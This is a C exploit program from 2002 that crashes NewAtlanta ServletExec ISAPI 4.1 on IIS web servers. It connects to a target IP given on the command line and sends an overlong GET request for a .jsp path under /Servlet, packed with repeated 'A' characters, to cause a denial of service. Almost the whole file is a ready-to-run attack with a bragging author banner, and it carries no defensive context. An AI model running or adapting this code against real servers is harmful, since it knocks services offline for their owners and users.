#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>

/*    This is Exploit code for a vulnerability in NewAtlanta ServletExec ISAPI 4.1.
      ServletExec 4.1 ISAPI is a Java Servlet/JSP Engine for Internet Information
      Server and is implemented as an ISAPI filter.
      Machines running this program is MS IIS server 4 and 5.
	  This code can simple crash the server, successfully preform a DoS attack!
	  It sends a string that servletExec don't like but have to eat, and 
	  this will make the server crash, BIG TIME =)
	  This file assuming the www server is on port 80 and that the servlet engine
	  is located in the /Servlet directory. 
	  Jonas "bl0wfi5h" Nyberg and Digital-Root.com is proud to present ServletExecCrash.
	  You can contact me at: bl0wfi5h@digital-root.com or bl0wfi5h@hotmail.com.
	  This was finished: 2002-05-24 @21:49 Swedish time
*/

void banner(void);

typedef unsigned short int USHORT;
typedef unsigned long int ULONG;



int main(int argc, char** argv[])
{
  int sockfd;
  struct sockaddr_in dest_addr;

  
  int len, bytes_sent, select;
  char* string = "GET /Servlet/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.jsp";
 
  if(argc < 2 || argc > 2)
  {
  	printf("Usage: ./servletExecCrash ip\n");
  	printf("Assuming that its port 80, which is default for most www servers\n");
  	printf("If this is a case where this is not true, change the got damn source yourself!\n");
  	exit(1);
  }
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_port = htons(80);
  inet_aton(argv[1], &(dest_addr.sin_addr));
  memset(&(dest_addr.sin_zero), '\0',8);
  len = strlen(string);
  
  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1 ) 
  {
  	printf("problem with your socket!");
  	exit(1);
  }
  
  connect(sockfd, (struct sockaddr *)& dest_addr, sizeof(struct sockaddr));
  
 	
  bytes_sent = send(sockfd, string, len, 0);	
  if(bytes_sent == -1)
  {
    printf("\nYou are having problem sending, the information\n");
    exit(1);
  }
	printf("\nYou have sent: %d", bytes_sent);
	printf(" bytes to: %s", argv[1]);
	close(sockfd);	
	banner();
	return 0;

}
void banner(void)
{
	printf("\n\n***********************************************\n");
	printf("*****CODE MADE BY: JONAS [BL0wFi5h] NYBERG*******\n");
	printf("*********DIGITAL-ROOT PROUDLY PRESENT*************\n");
	printf("****************SERVLETEXECCRASH******************\n");
	printf("**************************************************\n");
	

}
